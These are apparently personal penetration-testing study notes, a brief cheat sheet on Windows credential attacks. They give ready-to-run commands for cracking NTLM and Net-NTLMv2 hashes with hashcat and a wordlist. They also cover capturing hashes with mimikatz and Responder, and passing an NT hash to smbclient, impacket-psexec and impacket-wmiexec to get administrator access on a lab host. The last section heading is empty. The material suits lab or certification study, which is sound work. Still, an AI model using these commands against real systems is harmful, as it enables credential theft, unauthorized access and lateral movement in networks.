### Cracking NTLM

extract ntlm hash using mimkatz
crack with hashcat
hashcat -m 1000 steve.hash rockyou.txt -r rules\best64.rule --force

### Passing NTLM

smbclient
crackmapexec
psexec
wmiexec

smbclient \\\\192.168.221.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.221.212


impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.221.212

### Cracking Net-NTLMv2

extract hash using responder and any smb service with false share
capture the hash and crack using hashcat
hashcat -m 5600 sam.hash rockyou.txt --force

### Passing Net-NTLMv2

